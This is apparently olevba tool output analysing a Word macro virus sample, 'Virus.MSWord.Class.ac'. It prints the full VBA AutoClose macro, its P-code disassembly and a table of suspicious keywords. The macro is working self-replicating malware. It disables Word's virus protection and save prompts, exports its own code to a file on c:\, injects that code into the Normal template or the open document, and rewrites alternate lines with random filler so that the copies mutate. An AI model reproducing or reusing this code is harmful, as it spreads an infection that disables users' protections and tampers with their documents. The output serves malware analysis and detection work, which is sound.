olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
Options.ConfirmConversions = 0
UIL = QBN + KGN
PS16 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
OFG = SSM + VUE
Options.SaveNormalPrompt = 0
PVF = LCV + OAM
Options.VirusProtection = 0
CCR = GBG + IGU
DG5 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VIG = DDO + JJP
Application.EnableCancelKey = 0
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set EI66 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
CP86 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set EI66 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
UM91 = True
OLS = BEO + JHD
End If
PUL = BQI + KKE
If UM91 = True Then
HCM = DUC + JGT
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\" & Application.UserInitials
QGO = FBA + HRG
EI66.CodeModule.AddFromFile ("c:\" & Application.UserInitials)
FKF = HAK + ETM
EI66.CodeModule.deletelines 1, 4
QUH = LBN + JVC
EI66.CodeModule.replaceline 1, "Sub AutoClose()"
UNH = DKE + VCA
ElseIf CP86 = True Then
HMU = LIS + SOP
EI66.CodeModule.AddFromFile ("c:\" & Application.UserInitials)
VHK = JPD + JLR
EI66.CodeModule.deletelines 1, 4
LJL = FNK + OTI
End If
GGD = LEM + HTK
With EI66.CodeModule
EPQ = NRD + REV
For x = 2 To (EI66.CodeModule.CountOfLines - 1) Step 2
BBR = IKC + CDB
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
PLM = EKQ + QIT
Next x
QBN = PAJ + IGV
End With
RPJ = QGH + JUC
EH42:
OHC = EBJ + VLK
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.ac
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11504 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	Ld GGR 
' 	Ld AQR 
' 	Add 
' 	St PLM 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld SRI 
' 	Ld VTB 
' 	Add 
' 	St PAJ 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' 	Ld QBN 
' 	Ld KGN 
' 	Add 
' 	St UIL 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St PS16 
' Line #7:
' 	Ld SSM 
' 	Ld VUE 
' 	Add 
' 	St OFG 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	Ld LCV 
' 	Ld OAM 
' 	Add 
' 	St PVF 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	Ld GBG 
' 	Ld IGU 
' 	Add 
' 	St CCR 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St DG5 
' Line #13:
' 	Ld DDO 
' 	Ld JJP 
' 	Add 
' 	St VIG 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #15:
' 	Ld EMB 
' 	Ld KTF 
' 	Add 
' 	St HNE 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld UNN 
' 	Ld JCM 
' 	Add 
' 	St RIG 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set EI66 
' Line #19:
' 	Ld ALU 
' 	Ld JOL 
' 	Add 
' 	St PUS 
' Line #20:
' 	LitVarSpecial (True)
' 	St CP86 
' Line #21:
' 	Ld IFB 
' 	Ld FVB 
' 	Add 
' 	St LKH 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld DKF 
' 	Ld NLD 
' 	Add 
' 	St IIK 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld ICR 
' 	Ld KQN 
' 	Add 
' 	St UOL 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set EI66 
' Line #27:
' 	Ld BCH 
' 	Ld CAL 
' 	Add 
' 	St SAE 
' Line #28:
' 	LitVarSpecial (True)
' 	St UM91 
' Line #29:
' 	Ld BEO 
' 	Ld JHD 
' 	Add 
' 	St OLS 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld BQI 
' 	Ld KKE 
' 	Add 
' 	St PUL 
' Line #32:
' 	Ld UM91 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #33:
' 	Ld DUC 
' 	Ld JGT 
' 	Add 
' 	St HCM 
' Line #34:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	Ld FBA 
' 	Ld HRG 
' 	Add 
' 	St QGO 
' Line #36:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	Paren 
' 	Ld EI66 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #37:
' 	Ld HAK 
' 	Ld ETM 
' 	Add 
' 	St FKF 
' Line #38:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld EI66 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #39:
' 	Ld LBN 
' 	Ld JVC 
' 	Add 
' 	St QUH 
' Line #40:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld EI66 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #41:
' 	Ld DKE 
' 	Ld VCA 
' 	Add 
' 	St UNH 
' Line #42:
' 	Ld CP86 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #43:
' 	Ld LIS 
' 	Ld SOP 
' 	Add 
' 	St HMU 
' Line #44:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	Paren 
' 	Ld EI66 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #45:
' 	Ld JPD 
' 	Ld JLR 
' 	Add 
' 	St VHK 
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld EI66 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #47:
' 	Ld FNK 
' 	Ld OTI 
' 	Add 
' 	St LJL 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld LEM 
' 	Ld HTK 
' 	Add 
' 	St GGD 
' Line #50:
' 	StartWithExpr 
' 	Ld EI66 
' 	MemLd CodeModule 
' 	With 
' Line #51:
' 	Ld NRD 
' 	Ld REV 
' 	Add 
' 	St EPQ 
' Line #52:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld EI66 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #53:
' 	Ld IKC 
' 	Ld CDB 
' 	Add 
' 	St BBR 
' Line #54:
' 	Ld x 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #55:
' 	Ld EKQ 
' 	Ld QIT 
' 	Add 
' 	St PLM 
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld PAJ 
' 	Ld IGV 
' 	Add 
' 	St QBN 
' Line #58:
' 	EndWith 
' Line #59:
' 	Ld QGH 
' 	Ld JUC 
' 	Add 
' 	St RPJ 
' Line #60:
' 	Label EH42 
' Line #61:
' 	Ld EBJ 
' 	Ld VLK 
' 	Add 
' 	St OHC 
' Line #62:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

